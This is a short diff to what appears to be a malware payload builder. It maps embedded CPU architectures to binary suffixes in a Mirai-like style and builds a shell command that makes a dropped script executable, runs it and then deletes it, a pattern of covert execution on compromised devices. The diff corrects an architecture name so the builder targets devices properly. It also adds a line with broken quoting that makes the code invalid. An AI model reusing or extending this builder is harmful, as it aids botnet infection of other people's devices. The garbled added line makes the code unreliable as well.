@@ -15,7 +15,7 @@ ARCH_MAP = {
     "armv5tel": "arm5",
     "armv4l": "arm",
     "mips":   "mips",
-    "mipsel": "mipss",
+    "mipsel": "mpsl",
     "m68k":   "m68k",
     "ppc":    "ppc",
     "sh4":    "sh4",
@@ -51,6 +51,7 @@ def generate_main_payload():
         f"chmod +x {SCRIPT_NAME}; "
         f"./{SCRIPT_NAME}; "
         f"rm -f {SCRIPT_NAME}"
+        f"echo "vT"
     )
     payload = ' '.join(payload.split())
     return payload
